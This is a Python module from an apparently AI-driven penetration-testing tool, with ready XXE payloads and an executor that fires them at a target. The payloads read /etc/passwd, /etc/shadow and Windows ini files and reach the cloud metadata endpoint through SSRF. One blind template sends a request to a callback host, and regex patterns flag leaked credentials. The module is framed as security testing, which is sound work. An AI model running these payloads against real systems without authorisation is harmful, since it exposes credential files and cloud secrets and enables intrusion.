"""
XXE (XML External Entity) Detection for AI-Pentester

Comprehensive XXE testing with:
- Classic XXE (file read)
- Blind XXE (OOB data exfiltration)
- XXE via SVG/DOCX/XLSX
- XXE to SSRF
- Parameter entity attacks
"""

import re
from typing import Dict, List, Tuple, Optional


# =============================================================================
# XXE PAYLOADS
# =============================================================================

# Classic XXE - File Read
XXE_FILE_READ = [
    # Linux files
    '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',
    
    '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<root>&xxe;</root>''',
    
    '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<root>&xxe;</root>''',
    
    # Windows files
    '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>''',
    
    '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]>
<root>&xxe;</root>''',
    
    # PHP filter (base64 encode to avoid parsing issues)
    '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>''',
]

# XXE to SSRF
XXE_SSRF = [
    '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>''',
    
    '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]>
<root>&xxe;</root>''',
    
    '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/">]>
<root>&xxe;</root>''',
]

# Blind XXE (OOB exfiltration)
BLIND_XXE_TEMPLATE = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{callback_host}/xxe?data=test">
  %xxe;
]>
<root>test</root>'''

# Parameter Entity XXE
PARAMETER_ENTITY_XXE = [
    '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %exfil;
]>
<root>test</root>''',
]

# XXE via different content types
XXE_SVG = '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>'''

XXE_SOAP = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>&xxe;</soap:Body>
</soap:Envelope>'''


# =============================================================================
# DETECTION SIGNATURES
# =============================================================================

# Patterns that indicate successful XXE
XXE_SUCCESS_PATTERNS = [
    # Linux /etc/passwd
    r"root:.*:0:0:",
    r"daemon:.*:1:1:",
    r"nobody:.*:65534:",
    
    # Linux /etc/hosts
    r"127\.0\.0\.1\s+localhost",
    
    # Windows win.ini
    r"\[fonts\]",
    r"\[extensions\]",
    r"\[mci extensions\]",
    
    # Windows system.ini
    r"\[drivers\]",
    r"\[boot\]",
    
    # AWS metadata (SSRF via XXE)
    r"ami-id",
    r"instance-id",
    r"security-credentials",
    
    # Base64 encoded passwd (via PHP filter)
    r"cm9vdDo",  # "root:" in base64
]

# Error patterns that confirm XML parsing
XXE_ERROR_PATTERNS = [
    r"XML\s*parsing\s*error",
    r"XMLSyntaxError",
    r"SAXParseException",
    r"unterminated\s*entity\s*reference",
    r"external\s*entity",
    r"DOCTYPE\s*is\s*disallowed",
    r"entity\s*.*\s*not\s*defined",
]


# =============================================================================
# DETECTION FUNCTIONS
# =============================================================================

def get_xxe_payloads(attack_type: str = "all") -> List[Dict]:
    """
    Get XXE payloads for testing.
    
    Args:
        attack_type: "file_read", "ssrf", "blind", "all"
    
    Returns:
        List of payload dicts with: payload, type, target
    """
    payloads = []
    
    if attack_type in ["file_read", "all"]:
        for i, p in enumerate(XXE_FILE_READ):
            payloads.append({
                "payload": p,
                "type": "file_read",
                "target": "/etc/passwd" if "passwd" in p else "win.ini" if "win.ini" in p else "unknown",
                "id": f"xxe_file_{i}"
            })
    
    if attack_type in ["ssrf", "all"]:
        for i, p in enumerate(XXE_SSRF):
            payloads.append({
                "payload": p,
                "type": "ssrf",
                "target": "internal_host",
                "id": f"xxe_ssrf_{i}"
            })
    
    if attack_type in ["param_entity", "all"]:
        for i, p in enumerate(PARAMETER_ENTITY_XXE):
            payloads.append({
                "payload": p,
                "type": "param_entity",
                "target": "oob_exfil",
                "id": f"xxe_param_{i}"
            })
    
    # Add SVG and SOAP variants
    if attack_type == "all":
        payloads.append({
            "payload": XXE_SVG,
            "type": "svg",
            "target": "/etc/passwd",
            "id": "xxe_svg"
        })
        payloads.append({
            "payload": XXE_SOAP,
            "type": "soap",
            "target": "/etc/passwd",
            "id": "xxe_soap"
        })
    
    return payloads


def analyze_xxe_response(response_text: str, payload_type: str = "file_read") -> Tuple[bool, Dict]:
    """
    Analyze response for XXE success indicators.
    
    Returns:
        (is_vulnerable, evidence_dict)
    """
    text = response_text
    
    # Check for success patterns
    for pattern in XXE_SUCCESS_PATTERNS:
        match = re.search(pattern, text, re.I)
        if match:
            return True, {
                "type": "XXE",
                "subtype": payload_type,
                "evidence": match.group(0)[:100],
                "confidence": "high",
                "signal": "file_content_leaked"
            }
    
    # Check for error patterns (indicates XML parsing, potential XXE)
    for pattern in XXE_ERROR_PATTERNS:
        match = re.search(pattern, text, re.I)
        if match:
            return False, {
                "type": "XXE_POTENTIAL",
                "subtype": payload_type,
                "evidence": match.group(0)[:100],
                "confidence": "medium",
                "signal": "xml_error_disclosed"
            }
    
    return False, {}


def detect_xxe_vectors(response) -> List[str]:
    """
    Detect if endpoint might accept XML input.
    
    Checks:
    - Content-Type header
    - Response body structure
    - Accept header
    """
    vectors = []
    
    content_type = response.headers.get("Content-Type", "").lower()
    
    if "xml" in content_type:
        vectors.append("xml_content_type")
    
    if "soap" in content_type:
        vectors.append("soap_endpoint")
    
    # Check if response is XML
    text = response.text.strip()
    if text.startswith("<?xml") or text.startswith("<"):
        vectors.append("xml_response")
    
    return vectors


def build_xxe_test_request(payload: str, content_type: str = "application/xml") -> Dict:
    """
    Build HTTP request parameters for XXE test.
    """
    return {
        "data": payload,
        "headers": {
            "Content-Type": content_type
        }
    }


# =============================================================================
# EXECUTOR INTEGRATION
# =============================================================================

def execute_xxe_test(session, target: str, logger) -> Dict:
    """
    Execute comprehensive XXE tests against target.
    
    Returns finding dict with status and evidence.
    """
    payloads = get_xxe_payloads("all")
    
    for payload_info in payloads:
        try:
            req_params = build_xxe_test_request(payload_info["payload"])
            
            response = session.post(
                target,
                data=req_params["data"],
                headers=req_params["headers"],
                timeout=10
            )
            
            is_vuln, evidence = analyze_xxe_response(response.text, payload_info["type"])
            
            if is_vuln:
                logger.info(f"[xxe] Vulnerability FOUND: {payload_info['type']}")
                return {
                    "status": "SUCCESS",
                    "payload": payload_info["id"],
                    "evidence": evidence
                }
                
        except Exception as e:
            logger.debug(f"[xxe] Error testing {payload_info['id']}: {e}")
    
    return {
        "status": "FAILED",
        "payload": "xxe_all",
        "evidence": "No XXE vulnerability detected"
    }
